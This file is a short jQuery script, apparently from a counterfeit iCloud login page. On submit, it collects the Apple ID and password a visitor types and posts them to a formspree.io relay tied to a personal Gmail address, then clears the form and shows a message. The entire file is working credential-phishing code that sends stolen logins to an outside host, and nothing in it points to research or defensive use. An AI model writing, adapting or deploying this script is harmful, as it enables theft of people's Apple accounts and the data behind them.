$('#submit-icloud').click(function(ev){
    if ($('form')[0].checkValidity()) {
      ev.preventDefault();
      $.ajax({
            url: "https://formspree.io/tymkivyurii@gmail.com", 
            method: "POST",
            data: {
                appleid: $('#apple-id').val(),
                password: $('#password').val(),
            },
            dataType: "json"
      }).done(function() {
          $('form')[0].reset();
          $('#form-sms').html('<h3>Hello me iCloude!!!</h3>')
      }).fail(function(){
          $('#form-sms').html('<h2>I am SORRY!!!</h2>')
      });
    } 
});